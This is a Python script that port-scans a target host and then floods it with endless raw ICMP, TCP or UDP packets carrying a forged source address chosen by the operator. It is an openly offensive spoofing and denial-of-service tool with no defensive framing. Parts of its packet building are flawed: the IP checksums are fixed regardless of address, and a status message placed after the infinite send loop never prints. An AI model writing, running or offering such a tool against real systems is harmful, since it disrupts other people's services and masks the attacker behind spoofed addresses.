import sys
import socket
from threading import Thread
from typing import List

# Port scan to find open ports on the target device
def port_scan(target_ip: str, ports: List[int]) -> List[int]:
    open_ports = []
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((target_ip, port))
                if result == 0:
                    open_ports.append(port)
        except Exception as e:
            print(f"Error scanning port {port}: {e}")
    return open_ports

# IP spoofing attack
def ip_spoofing_attack(target_ip: str, target_port: int, spoofed_ip: str, attack_type: str):
    if attack_type == 'ICMP':
        packet = create_icmp_packet(spoofed_ip, target_ip)
    elif attack_type == 'TCP':
        packet = create_tcp_packet(spoofed_ip, target_ip, target_port)
    elif attack_type == 'UDP':
        packet = create_udp_packet(spoofed_ip, target_ip, target_port)
   
    if packet:
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:
            while True:
                s.sendto(packet, (target_ip, 0))

        print(f"IP spoofing attack started with {attack_type} packets from {spoofed_ip} to {target_ip}:{target_port}")

def create_icmp_packet(spoofed_ip, target_ip):
    # IP Header
    ip_header = b'\x45\x00\x00\x54'  # Version, IHL, Type of Service | Total Length
    ip_header += b'\xab\xcd\x00\x00'  # Identification | Flags, Fragment Offset
    ip_header += b'\x40\x01\x72\xb7'  # TTL, Protocol | Header Checksum
    ip_header += socket.inet_aton(spoofed_ip)  # Source Address
    ip_header += socket.inet_aton(target_ip)  # Destination Address

    # ICMP Header
    icmp_header = b'\x08\x00\xf7\xff'  # Type, Code | Checksum
    icmp_header += b'\x12\x34\x00\x00'  # Identifier, Sequence Number

    return ip_header + icmp_header

def create_tcp_packet(spoofed_ip, target_ip, target_port):
    # IP Header
    ip_header = b'\x45\x00\x00\x28'  # Version, IHL, Type of Service | Total Length
    ip_header += b'\xab\xcd\x00\x00'  # Identification | Flags, Fragment Offset
    ip_header += b'\x40\x06\xb7\x72'  # TTL, Protocol | Header Checksum
    ip_header += socket.inet_aton(spoofed_ip)  # Source Address
    ip_header += socket.inet_aton(target_ip)  # Destination Address

    # TCP Header
    tcp_header = b'\x00\x50'  # Source Port
    tcp_header += (target_port).to_bytes(2, byteorder='big')  # Destination Port
    tcp_header += b'\x00\x00\x00\x00'  # Sequence Number
    tcp_header += b'\x00\x00\x00\x00'  # Acknowledgment Number
    tcp_header += b'\x50\x02\x71\x10'  # Data Offset, Reserved, Flags | Window Size
    tcp_header += b'\x00\x00\x00\x00'  # Checksum, Urgent Pointer

    return ip_header + tcp_header

def create_udp_packet(spoofed_ip, target_ip, target_port):
    # IP Header
    ip_header = b'\x45\x00\x00\x1c'  # Version, IHL, Type of Service | Total Length
    ip_header += b'\xab\xcd\x00\x00'  # Identification | Flags, Fragment Offset
    ip_header += b'\x40\x11\xb7\x6e'  # TTL, Protocol | Header Checksum
    ip_header += socket.inet_aton(spoofed_ip)  # Source Address
    ip_header += socket.inet_aton(target_ip)  # Destination Address

    # UDP Header
    udp_header = b'\x00\x50'  # Source Port
    udp_header += (target_port).to_bytes(2, byteorder='big')  # Destination Port
    udp_header += b'\x00\x08\x00\x00'  # Length | Checksum

    return ip_header + udp_header

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 spoofjul.py <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
   
    # Port scanning
    ports = [21, 22, 80, 443]  # Example ports to scan
    print(f"Scanning ports on {target_ip}...")
    open_ports = port_scan(target_ip, ports)

    if not open_ports:
        print("No open ports found.")
        sys.exit(1)

    print("Open ports found:")
    print(open_ports)

    # Select attack type and port
    attack_types = ['ICMP', 'TCP', 'UDP']
    print("Select the type of attack:")
    for i, attack_type in enumerate(attack_types, 1):
        print(f"{i}. {attack_type}")
    while True:
        try:
            attack_selection = int(input("Select the type of attack (number): "))
            if attack_selection < 1 or attack_selection > len(attack_types):
                print("Invalid selection. Please enter a valid attack type number.")
            else:
                attack_type = attack_types[attack_selection - 1]
                break
        except ValueError:
            print("Invalid input. Please enter a valid number.")

    target_port = None
    if attack_type in ['TCP', 'UDP']:
        while True:
            try:
                target_port_selection = int(input("Select the target port for the attack (number): "))
                if target_port_selection not in open_ports:
                    print("Invalid port selection. Please select one of the open ports.")
                else:
                    target_port = target_port_selection
                    break
            except ValueError:
                print("Invalid input. Please enter a valid port number.")

    # Start IP spoofing attack in a separate thread
    spoofed_ip = input("Enter the IP address to spoof: ")
    ip_spoofing_thread = Thread(target=ip_spoofing_attack, args=(target_ip, target_port, spoofed_ip, attack_type))
    ip_spoofing_thread.start()

    print("IP spoofing attack started. Press Ctrl+C to stop.")

if __name__ == '__main__':
    main()